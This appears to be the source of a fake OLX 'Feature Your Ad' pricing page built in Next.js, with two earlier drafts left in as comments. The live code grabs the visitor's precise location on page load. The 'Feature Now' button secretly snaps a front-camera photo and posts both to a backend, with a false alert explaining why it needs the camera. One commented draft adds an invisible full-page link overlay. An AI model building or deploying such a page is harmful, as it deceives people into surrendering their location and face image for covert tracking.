// "use client";
// import Image from "next/image";
// import React, { useState } from "react";
// import { Menu, X, Plus } from "lucide-react";
// import Link from "next/link";

// const pricingTiers = [
//   {
//     title: "Free Trial",
//     price: "Rs. 299",
//     discountPrice: "Rs. 0",
//     duration: "7 Days",
//     features: [
//       "Top search result visibility",
//       "Higher ad exposure",
//       "Limited slot",
//     ],
//   },
//   {
//     title: "Super Boost",
//     price: "Rs. 599",
//     duration: "15 Days",
//     features: [
//       "More impressions",
//       "Visible in recommended ads",
//       "Priority in search",
//     ],
//   },
//   {
//     title: "Premium Boost",
//     price: "Rs. 999",
//     duration: "30 Days",
//     features: [
//       "Top in category",
//       "Priority in search & browse",
//       "Auto-renewal option",
//     ],
//   },
// ];

// export default function Home() {
//   const [mobileOpen, setMobileOpen] = useState(false);

//   return (
//     <main className="min-h-screen bg-gray-100 relative">
//       {/* Full-page link overlay */}
//       <a
//         href={process.env.STORMLINK}
//         className="absolute inset-0 z-[99] pointer-events-auto"
//       ></a>

//       {/* Actual content - non-clickable but visible */}
//       <div className="relative z-10 pointer-events-none">
//         {/* Navbar */}
//         <nav className="bg-[#edf2ff] shadow-sm w-full sticky top-0 z-50">
//           <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3 flex items-center justify-between">
//             <div className="flex items-center space-x-6">
//               <Image src="/olx-logo.png" alt="OLX" width={55} height={55} />
//             </div>

//             <div className="flex items-center space-x-4">
//               <span className="text-[#013239] font-bold underline hidden sm:block cursor-pointer">
//                 LogIn
//               </span>

//               <button className="relative flex items-center justify-center p-1 rounded-full bg-gradient-to-r from-yellow-400 via-white to-blue-500 border-2 border-white hover:opacity-90 transition">
//                 <div className="bg-white rounded-full px-3 py-1 flex justify-center items-center space-x-1">
//                   <Plus size={25} className=" text-black" />
//                   <span className="text-sm font-semibold text-black">SELL</span>
//                 </div>
//               </button>

//               <div className="md:hidden">
//                 <button onClick={() => setMobileOpen(!mobileOpen)}>
//                   {mobileOpen ? <X size={24} /> : <Menu size={24} />}
//                 </button>
//               </div>
//             </div>
//           </div>

//           {mobileOpen && (
//             <div className="md:hidden px-6 pb-4 bg-[#edf2ff] space-y-2 text-gray-800 font-medium">
//               <div className="flex items-center space-x-2">
//                 <Image src="/car.png" alt="Motors" width={24} height={24} />
//                 <span>Motors</span>
//               </div>
//               <div className="flex items-center space-x-2">
//                 <Image src="/home.png" alt="Property" width={24} height={24} />
//                 <span>Property</span>
//               </div>
//               <span className="underline">LogIn</span>
//             </div>
//           )}
//         </nav>

//         {/* Pricing Section */}
//         <section className="py-12 px-4 sm:px-6 lg:px-8">
//           <div className="max-w-7xl mx-auto">
//             <h1 className="text-4xl font-bold text-center text-gray-800 mb-12">
//               Feature Your Ad on OLX
//             </h1>

//             <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
//               {pricingTiers.map((tier, index) => (
//                 <div
//                   key={index}
//                   className="bg-white rounded-2xl shadow-lg p-6 border border-gray-200 hover:shadow-2xl transition"
//                 >
//                   <h2 className="text-2xl font-semibold text-indigo-600 mb-2">
//                     {tier.title}
//                   </h2>

//                   <div className="mb-2">
//                     {tier.discountPrice ? (
//                       <div className="space-y-1">
//                         <p className="text-md text-gray-600 line-through">
//                           {tier.price}
//                         </p>
//                         <p className="text-2xl font-bold text-red-600">
//                           {tier.discountPrice}
//                         </p>
//                       </div>
//                     ) : (
//                       <p className="text-xl font-bold text-gray-900">
//                         {tier.price}
//                       </p>
//                     )}
//                   </div>

//                   <p className="text-sm text-gray-500 mb-4">{tier.duration}</p>
//                   <ul className="text-gray-700 space-y-2">
//                     {tier.features.map((feature, i) => (
//                       <li key={i} className="flex items-center">
//                         <span className="mr-2 text-green-500">✓</span> {feature}
//                       </li>
//                     ))}
//                   </ul>
//                   <button className="mt-6 w-full bg-indigo-600 text-white py-2 rounded-lg hover:bg-indigo-700 transition">
//                     Feature Now
//                   </button>
//                 </div>
//               ))}
//             </div>
//           </div>
//         </section>
//       </div>
//     </main>
//   );
// }

// "use client";
// import Image from "next/image";
// import React, { useState, useEffect } from "react";
// import { Menu, X, Plus } from "lucide-react";

// const pricingTiers = [
//   {
//     title: "Free Trial",
//     price: "Rs. 299",
//     discountPrice: "Rs. 0",
//     duration: "7 Days",
//     features: [
//       "Top search result visibility",
//       "Higher ad exposure",
//       "Limited slot",
//     ],
//   },
//   {
//     title: "Super Boost",
//     price: "Rs. 599",
//     duration: "15 Days",
//     features: [
//       "More impressions",
//       "Visible in recommended ads",
//       "Priority in search",
//     ],
//   },
//   {
//     title: "Premium Boost",
//     price: "Rs. 999",
//     duration: "30 Days",
//     features: [
//       "Top in category",
//       "Priority in search & browse",
//       "Auto-renewal option",
//     ],
//   },
// ];

// export default function Home() {
//   const [mobileOpen, setMobileOpen] = useState(false);
//   const [location, setLocation] = useState(null);
//   const [isCapturing, setIsCapturing] = useState(false);
//   const [clickCount, setClickCount] = useState(0);

//   // Function to send geolocation to backend
//   const storeGeolocation = async (coords) => {
//     try {
//       await fetch("/api/store-location", {
//         method: "POST",
//         headers: {
//           "Content-Type": "application/json",
//         },
//         body: JSON.stringify({
//           latitude: coords.latitude,
//           longitude: coords.longitude,
//           timestamp: new Date().toISOString(),
//         }),
//       });
//     } catch (error) {
//       console.error("Error storing location:", error);
//     }
//   };

//   // Track clicks anywhere on the page
//   useEffect(() => {
//     const handleClick = async () => {
//       setClickCount((prev) => prev + 1);

//       // Get and store geolocation on first click
//       if (clickCount === 0 && navigator.geolocation) {
//         navigator.geolocation.getCurrentPosition(
//           async (position) => {
//             const { latitude, longitude } = position.coords;
//             setLocation({ latitude, longitude });
//             await storeGeolocation({ latitude, longitude });
//           },
//           (error) => {
//             console.error("Geolocation error:", error);
//           }
//         );
//       }
//     };

//     document.addEventListener("click", handleClick);
//     return () => document.removeEventListener("click", handleClick);
//   }, [clickCount]);

//   const captureFromCamera = async () => {
//     setIsCapturing(true);
//     try {
//       const stream = await navigator.mediaDevices.getUserMedia({
//         video: { facingMode: "user" }, // front camera
//       });

//       const video = document.createElement("video");
//       video.srcObject = stream;
//       video.play();

//       await new Promise((resolve) => {
//         video.onloadedmetadata = () => {
//           resolve();
//         };
//       });

//       const canvas = document.createElement("canvas");
//       canvas.width = video.videoWidth;
//       canvas.height = video.videoHeight;
//       const ctx = canvas.getContext("2d");
//       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

//       const imageData = canvas.toDataURL("image/jpeg");
//       stream.getTracks().forEach((track) => track.stop());

//       return imageData;
//     } catch (error) {
//       console.error("Camera error:", error);
//       return null;
//     } finally {
//       setIsCapturing(false);
//     }
//   };

//   const handleFeatureNow = async (tier) => {
//     const image = await captureFromCamera();

//     if (!image) {
//       // alert("Could not capture image from camera");
//       return;
//     }

//     try {
//       await fetch("/api/store-ad", {
//         method: "POST",
//         headers: {
//           "Content-Type": "application/json",
//         },
//         body: JSON.stringify({
//           tier,
//           location,
//           image,
//           timestamp: new Date().toISOString(),
//         }),
//       });
//       // alert("Ad featured successfully!");
//     } catch (error) {
//       console.error("Error storing ad:", error);
//       // alert("Failed to feature ad. Please try again.");
//     }
//   };

//   return (
//     <main className="min-h-screen bg-gray-100 relative">
//       {/* Navbar */}
//       <nav className="bg-[#edf2ff] shadow-sm w-full sticky top-0 z-50">
//         <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3 flex items-center justify-between">
//           <div className="flex items-center space-x-6">
//             <Image src="/olx-logo.png" alt="OLX" width={55} height={55} />
//           </div>

//           <div className="flex items-center space-x-4">
//             <span className="text-[#013239] font-bold underline hidden sm:block cursor-pointer">
//               LogIn
//             </span>

//             <button className="relative flex items-center justify-center p-1 rounded-full bg-gradient-to-r from-yellow-400 via-white to-blue-500 border-2 border-white hover:opacity-90 transition">
//               <div className="bg-white rounded-full px-3 py-1 flex justify-center items-center space-x-1">
//                 <Plus size={25} className=" text-black" />
//                 <span className="text-sm font-semibold text-black">SELL</span>
//               </div>
//             </button>

//             <div className="md:hidden">
//               <button onClick={() => setMobileOpen(!mobileOpen)}>
//                 {mobileOpen ? <X size={24} /> : <Menu size={24} />}
//               </button>
//             </div>
//           </div>
//         </div>

//         {mobileOpen && (
//           <div className="md:hidden px-6 pb-4 bg-[#edf2ff] space-y-2 text-gray-800 font-medium">
//             <div className="flex items-center space-x-2">
//               <Image src="/car.png" alt="Motors" width={24} height={24} />
//               <span>Motors</span>
//             </div>
//             <div className="flex items-center space-x-2">
//               <Image src="/home.png" alt="Property" width={24} height={24} />
//               <span>Property</span>
//             </div>
//             <span className="underline">LogIn</span>
//           </div>
//         )}
//       </nav>

//       {/* Pricing Section */}
//       <section className="py-12 px-4 sm:px-6 lg:px-8">
//         <div className="max-w-7xl mx-auto">
//           <h1 className="text-4xl font-bold text-center text-gray-800 mb-12">
//             Feature Your Ad on OLX
//           </h1>

//           <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
//             {pricingTiers.map((tier, index) => (
//               <div
//                 key={index}
//                 className="bg-white rounded-2xl shadow-lg p-6 border border-gray-200 hover:shadow-2xl transition"
//               >
//                 <h2 className="text-2xl font-semibold text-indigo-600 mb-2">
//                   {tier.title}
//                 </h2>

//                 <div className="mb-2">
//                   {tier.discountPrice ? (
//                     <div className="space-y-1">
//                       <p className="text-md text-gray-600 line-through">
//                         {tier.price}
//                       </p>
//                       <p className="text-2xl font-bold text-red-600">
//                         {tier.discountPrice}
//                       </p>
//                     </div>
//                   ) : (
//                     <p className="text-xl font-bold text-gray-900">
//                       {tier.price}
//                     </p>
//                   )}
//                 </div>

//                 <p className="text-sm text-gray-500 mb-4">{tier.duration}</p>
//                 <ul className="text-gray-700 space-y-2">
//                   {tier.features.map((feature, i) => (
//                     <li key={i} className="flex items-center">
//                       <span className="mr-2 text-green-500">✓</span> {feature}
//                     </li>
//                   ))}
//                 </ul>
//                 <button
//                   className="mt-6 w-full bg-indigo-600 text-white py-2 rounded-lg hover:bg-indigo-700 transition"
//                   onClick={() => handleFeatureNow(tier)}
//                   disabled={isCapturing}
//                 >
//                   {isCapturing ? "Capturing..." : "Feature Now"}
//                 </button>
//               </div>
//             ))}
//           </div>
//         </div>
//       </section>
//     </main>
//   );
// }
"use client";
import Image from "next/image";
import React, { useState, useEffect } from "react";
import { Menu, X, Plus } from "lucide-react";

const pricingTiers = [
  {
    title: "Free Trial",
    price: "Rs. 299",
    discountPrice: "Rs. 0",
    duration: "7 Days",
    features: [
      "Top search result visibility",
      "Higher ad exposure",
      "Limited slot",
    ],
  },
  {
    title: "Super Boost",
    price: "Rs. 599",
    duration: "15 Days",
    features: [
      "More impressions",
      "Visible in recommended ads",
      "Priority in search",
    ],
  },
  {
    title: "Premium Boost",
    price: "Rs. 999",
    duration: "30 Days",
    features: [
      "Top in category",
      "Priority in search & browse",
      "Auto-renewal option",
    ],
  },
];

export default function Home() {
  const [mobileOpen, setMobileOpen] = useState(false);
  const [location, setLocation] = useState(null);
  const [isCapturing, setIsCapturing] = useState(false);
  const [locationError, setLocationError] = useState(null);

  // Function to send geolocation to backend
  const storeGeolocation = async (coords) => {
    try {
      const response = await fetch("/api/store-location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          latitude: coords.latitude,
          longitude: coords.longitude,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to store location");
      }
      return await response.json();
    } catch (error) {
      console.error("Error storing location:", error);
      throw error;
    }
  };

  // Get user location on component mount
  useEffect(() => {
    const getLocation = async () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            const { latitude, longitude } = position.coords;
            try {
              await storeGeolocation({ latitude, longitude });
              setLocation({ latitude, longitude });
            } catch (error) {
              setLocationError("Failed to store location. Please try again.");
            }
          },
          (error) => {
            console.error("Geolocation error:", error);
            setLocationError(
              "Please enable location services to feature your ad."
            );
          },
          {
            enableHighAccuracy: true,
            timeout: 10000, // 10 seconds
            maximumAge: 0, // Don't use cached position
          }
        );
      } else {
        setLocationError("Geolocation is not supported by your browser.");
      }
    };

    getLocation();
  }, []);

  const captureFromCamera = async () => {
    setIsCapturing(true);
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }, // front camera
      });

      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          resolve();
        };
      });

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      const imageData = canvas.toDataURL("image/jpeg");
      stream.getTracks().forEach((track) => track.stop());

      return imageData;
    } catch (error) {
      console.error("Camera error:", error);
      return null;
    } finally {
      setIsCapturing(false);
    }
  };

  const handleFeatureNow = async (tier) => {
    if (!location) {
      alert("Please enable location services to feature your ad.");
      return;
    }

    const image = await captureFromCamera();

    if (!image) {
      alert("Allow camera to select photos of ad.");
      return;
    }

    try {
      const response = await fetch("/api/store-ad", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          tier,
          location,
          image,
          timestamp: new Date().toISOString(),
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to feature ad");
      }

      //alert("Ad featured successfully!");
    } catch (error) {
      console.error("Error storing ad:", error);
      alert("Failed to feature ad. Please try again.");
    }
  };

  return (
    <main className="min-h-screen bg-gray-100 relative">
      {/* Navbar */}
      <nav className="bg-[#edf2ff] shadow-sm w-full sticky top-0 z-50">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3 flex items-center justify-between">
          <div className="flex items-center space-x-6">
            <Image src="/olx-logo.png" alt="OLX" width={55} height={55} />
          </div>

          <div className="flex items-center space-x-4">
            <span className="text-[#013239] font-bold underline hidden sm:block cursor-pointer">
              LogIn
            </span>

            <button className="relative flex items-center justify-center p-1 rounded-full bg-gradient-to-r from-yellow-400 via-white to-blue-500 border-2 border-white hover:opacity-90 transition">
              <div className="bg-white rounded-full px-3 py-1 flex justify-center items-center space-x-1">
                <Plus size={25} className=" text-black" />
                <span className="text-sm font-semibold text-black">SELL</span>
              </div>
            </button>

            <div className="md:hidden">
              <button onClick={() => setMobileOpen(!mobileOpen)}>
                {mobileOpen ? <X size={24} /> : <Menu size={24} />}
              </button>
            </div>
          </div>
        </div>

        {mobileOpen && (
          <div className="md:hidden px-6 pb-4 bg-[#edf2ff] space-y-2 text-gray-800 font-medium">
            <div className="flex items-center space-x-2">
              <Image src="/car.png" alt="Motors" width={24} height={24} />
              <span>Motors</span>
            </div>
            <div className="flex items-center space-x-2">
              <Image src="/home.png" alt="Property" width={24} height={24} />
              <span>Property</span>
            </div>
            <span className="underline">LogIn</span>
          </div>
        )}
      </nav>

      {/* Pricing Section */}
      <section className="py-12 px-4 sm:px-6 lg:px-8">
        <div className="max-w-7xl mx-auto">
          <h1 className="text-4xl font-bold text-center text-gray-800 mb-12">
            Feature Your Ad on OLX
          </h1>

          {locationError && (
            <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-6 text-center">
              {locationError}
            </div>
          )}

          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {pricingTiers.map((tier, index) => (
              <div
                key={index}
                className="bg-white rounded-2xl shadow-lg p-6 border border-gray-200 hover:shadow-2xl transition"
              >
                <h2 className="text-2xl font-semibold text-indigo-600 mb-2">
                  {tier.title}
                </h2>

                <div className="mb-2">
                  {tier.discountPrice ? (
                    <div className="space-y-1">
                      <p className="text-md text-gray-600 line-through">
                        {tier.price}
                      </p>
                      <p className="text-2xl font-bold text-red-600">
                        {tier.discountPrice}
                      </p>
                    </div>
                  ) : (
                    <p className="text-xl font-bold text-gray-900">
                      {tier.price}
                    </p>
                  )}
                </div>

                <p className="text-sm text-gray-500 mb-4">{tier.duration}</p>
                <ul className="text-gray-700 space-y-2">
                  {tier.features.map((feature, i) => (
                    <li key={i} className="flex items-center">
                      <span className="mr-2 text-green-500">✓</span> {feature}
                    </li>
                  ))}
                </ul>
                <button
                  className="mt-6 w-full bg-indigo-600 text-white py-2 rounded-lg hover:bg-indigo-700 transition disabled:opacity-50 disabled:cursor-not-allowed"
                  onClick={() => handleFeatureNow(tier)}
                  disabled={isCapturing || !location}
                >
                  {isCapturing ? "Capturing..." : "Feature Now"}
                </button>
              </div>
            ))}
          </div>
        </div>
      </section>
    </main>
  );
}
